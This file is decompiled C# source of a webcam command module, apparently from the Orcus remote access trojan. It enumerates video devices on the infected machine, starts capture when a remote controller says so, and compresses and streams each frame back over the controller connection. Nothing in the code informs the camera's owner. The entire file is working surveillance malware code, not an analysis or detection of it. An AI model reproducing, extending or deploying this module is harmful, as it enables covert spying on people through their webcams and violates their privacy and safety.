using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Threading;
using AForge.Video;
using AForge.Video.DirectShow;
using Orcus.Plugins;
using Orcus.Shared.Commands.Webcam;
using Orcus.Shared.Data;
using Orcus.Shared.NetSerializer;
using Orcus.Shared.Utilities.Compression;
using Orcus.Utilities;

namespace Orcus.Commands.Webcam;

internal class WebcamCommand : Command
{
	private readonly object _framesLock = new object();

	private readonly object _unsafeStreamCodecLock = new object();

	private string _currentDevice;

	private int _currentResolution;

	private Bitmap _lastFrame;

	private AutoResetEvent _screenWaitEvent;

	private UnsafeStreamCodec _unsafeStreamCodec;

	private VideoCaptureDevice _videoCaptureDevice;

	private WebcamSettings _webcamSettings;

	private bool _isRunning;

	public override void Dispose()
	{
		lock (_framesLock)
		{
			Bitmap lastFrame = _lastFrame;
			if (lastFrame != null)
			{
				((Image)lastFrame).Dispose();
			}
			_lastFrame = null;
		}
		VideoCaptureDevice videoCaptureDevice = _videoCaptureDevice;
		if (videoCaptureDevice != null)
		{
			videoCaptureDevice.Stop();
		}
		UnsafeStreamCodec unsafeStreamCodec = _unsafeStreamCodec;
		if (unsafeStreamCodec != null)
		{
			unsafeStreamCodec.Dispose();
		}
		_unsafeStreamCodec = null;
		_videoCaptureDevice = null;
	}

	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected I4, but got Unknown
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_008d: Expected O, but got Unknown
		//IL_0152: Unknown result type (might be due to invalid IL or missing references)
		//IL_0157: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_01e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_023f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0249: Expected O, but got Unknown
		//IL_0280: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0304: Unknown result type (might be due to invalid IL or missing references)
		//IL_030e: Expected O, but got Unknown
		//IL_0352: Unknown result type (might be due to invalid IL or missing references)
		//IL_035c: Expected O, but got Unknown
		//IL_0388: Unknown result type (might be due to invalid IL or missing references)
		//IL_0392: Expected O, but got Unknown
		WebcamCommunication val = (WebcamCommunication)parameter[0];
		switch ((int)val)
		{
		default:
			throw new ArgumentOutOfRangeException();
		case 0:
			if (_lastFrame == null)
			{
				if (!_isRunning)
				{
					break;
				}
				_screenWaitEvent?.Close();
				_screenWaitEvent = new AutoResetEvent(initialState: false);
				if (!_screenWaitEvent.WaitOne(10000, exitContext: false))
				{
					if (_isRunning)
					{
						((Command)this).ResponseByte((byte)9, connectionInfo);
						_videoCaptureDevice.remove_NewFrame(new NewFrameEventHandler(_videoCaptureDevice_NewFrame));
						_videoCaptureDevice.Stop();
						UnsafeStreamCodec unsafeStreamCodec2 = _unsafeStreamCodec;
						if (unsafeStreamCodec2 != null)
						{
							unsafeStreamCodec2.Dispose();
						}
						_unsafeStreamCodec = null;
						_videoCaptureDevice = null;
					}
					break;
				}
			}
			if (!_isRunning)
			{
				break;
			}
			lock (_unsafeStreamCodecLock)
			{
				if (_isRunning)
				{
					if (_unsafeStreamCodec != null && (_currentResolution != _webcamSettings.get_Resolution() || _currentDevice != _webcamSettings.get_MonikerString()))
					{
						_unsafeStreamCodec.Dispose();
						_unsafeStreamCodec = null;
					}
					if (_unsafeStreamCodec == null)
					{
						_currentResolution = _webcamSettings.get_Resolution();
						_currentDevice = _webcamSettings.get_MonikerString();
						UnsafeStreamCodec val2 = new UnsafeStreamCodec((UnsafeStreamCodecParameters)0);
						val2.set_ImageQuality((int)parameter[1]);
						_unsafeStreamCodec = val2;
					}
					IDataInfo dataInfo;
					lock (_framesLock)
					{
						BitmapData val3 = _lastFrame.LockBits(new Rectangle(0, 0, ((Image)_lastFrame).get_Width(), ((Image)_lastFrame).get_Height()), (ImageLockMode)1, (PixelFormat)2498570);
						dataInfo = (IDataInfo)(object)_unsafeStreamCodec.CodeImage(val3.get_Scan0(), new Rectangle(0, 0, val3.get_Width(), val3.get_Height()), new Size(((Image)_lastFrame).get_Width(), ((Image)_lastFrame).get_Height()), val3.get_PixelFormat());
						_lastFrame.UnlockBits(val3);
					}
					connectionInfo.UnsafeResponse((Command)(object)this, dataInfo.get_Length() + 1, (Action<BinaryWriter>)delegate(BinaryWriter writer)
					{
						writer.Write((byte)6);
						dataInfo.WriteIntoStream(writer.BaseStream);
					});
				}
				break;
			}
		case 1:
			if (CoreHelper.RunningOnVistaOrGreater)
			{
				List<WebcamInfo> list = ((IEnumerable)new FilterInfoCollection(FilterCategory.VideoInputDevice)).OfType<FilterInfo>().Select((Func<FilterInfo, WebcamInfo>)delegate(FilterInfo x)
				{
					//IL_0000: Unknown result type (might be due to invalid IL or missing references)
					//IL_0005: Unknown result type (might be due to invalid IL or missing references)
					//IL_0011: Unknown result type (might be due to invalid IL or missing references)
					//IL_001d: Unknown result type (might be due to invalid IL or missing references)
					//IL_0024: Unknown result type (might be due to invalid IL or missing references)
					//IL_005d: Expected O, but got Unknown
					WebcamInfo val4 = new WebcamInfo();
					val4.set_MonikerString(x.get_MonikerString());
					val4.set_Name(x.get_Name());
					val4.set_AvailableResolutions(((IEnumerable<VideoCapabilities>)new VideoCaptureDevice(x.get_MonikerString()).get_VideoCapabilities()).Select((Func<VideoCapabilities, WebcamResolution>)delegate(VideoCapabilities y)
					{
						//IL_0000: Unknown result type (might be due to invalid IL or missing references)
						//IL_0005: Unknown result type (might be due to invalid IL or missing references)
						//IL_0019: Unknown result type (might be due to invalid IL or missing references)
						//IL_002e: Expected O, but got Unknown
						WebcamResolution val5 = new WebcamResolution();
						Size frameSize = y.FrameSize;
						val5.set_Width(frameSize.Width);
						frameSize = y.FrameSize;
						val5.set_Heigth(frameSize.Height);
						return val5;
					}).ToList());
					return val4;
				}).ToList();
				((Command)this).ResponseBytes((byte)7, new Serializer(typeof(List<WebcamInfo>)).Serialize((object)list), connectionInfo);
			}
			else
			{
				((Command)this).ResponseByte((byte)10, connectionInfo);
			}
			break;
		case 2:
			_webcamSettings = new Serializer(typeof(WebcamSettings)).Deserialize<WebcamSettings>(parameter, 1);
			if (_videoCaptureDevice != null && _videoCaptureDevice.get_Source() != _webcamSettings.get_MonikerString())
			{
				_videoCaptureDevice.Stop();
				_videoCaptureDevice = null;
			}
			if (_videoCaptureDevice == null)
			{
				_videoCaptureDevice = new VideoCaptureDevice(_webcamSettings.get_MonikerString());
			}
			try
			{
				_videoCaptureDevice.set_VideoResolution(_videoCaptureDevice.get_VideoCapabilities()[_webcamSettings.get_Resolution()]);
			}
			catch (Exception)
			{
				((Command)this).ResponseByte((byte)8, connectionInfo);
			}
			_isRunning = true;
			_videoCaptureDevice.add_NewFrame(new NewFrameEventHandler(_videoCaptureDevice_NewFrame));
			_videoCaptureDevice.Start();
			((Command)this).ResponseByte((byte)4, connectionInfo);
			break;
		case 3:
			if (_videoCaptureDevice == null)
			{
				break;
			}
			_videoCaptureDevice.remove_NewFrame(new NewFrameEventHandler(_videoCaptureDevice_NewFrame));
			_videoCaptureDevice.Stop();
			_isRunning = false;
			lock (_unsafeStreamCodecLock)
			{
				UnsafeStreamCodec unsafeStreamCodec = _unsafeStreamCodec;
				if (unsafeStreamCodec != null)
				{
					unsafeStreamCodec.Dispose();
				}
				_unsafeStreamCodec = null;
			}
			_videoCaptureDevice = null;
			lock (_framesLock)
			{
				Bitmap lastFrame = _lastFrame;
				if (lastFrame != null)
				{
					((Image)lastFrame).Dispose();
				}
				_lastFrame = null;
			}
			((Command)this).ResponseByte((byte)5, connectionInfo);
			break;
		}
	}

	private void _videoCaptureDevice_NewFrame(object sender, NewFrameEventArgs e)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		lock (_framesLock)
		{
			Bitmap lastFrame = _lastFrame;
			if (lastFrame != null)
			{
				((Image)lastFrame).Dispose();
			}
			_lastFrame = (Bitmap)((Image)e.get_Frame()).Clone();
		}
		_screenWaitEvent?.Set();
	}

	protected override uint GetId()
	{
		return 18u;
	}
}
